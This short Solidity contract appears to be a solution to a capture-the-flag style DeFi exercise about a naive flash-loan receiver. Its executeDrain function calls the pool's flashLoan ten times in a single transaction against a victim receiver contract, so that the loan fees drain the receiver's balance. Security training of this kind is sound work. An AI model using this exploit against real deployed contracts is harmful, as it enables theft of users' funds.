// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/Address.sol";

interface NaiveReceiverLenderPoolInterface {
	function flashLoan(address borrower, uint256 borrowAmount) external;
}

contract CustomContract {
    using Address for address payable;

    address payable private pool;
    NaiveReceiverLenderPoolInterface public pool_contract;

    constructor(address payable poolAddress) {
        pool_contract = NaiveReceiverLenderPoolInterface(poolAddress);
    }

    // Function called by the pool during flash loan
    function executeDrain(address receiverContract) public payable {
		
		uint i = 0;
		
		while (i < 10) {
			
			// execute 10x flashloan in receiver in single TX
			pool_contract.flashLoan(receiverContract, 1);
			
			i++;
		}
		
    }
}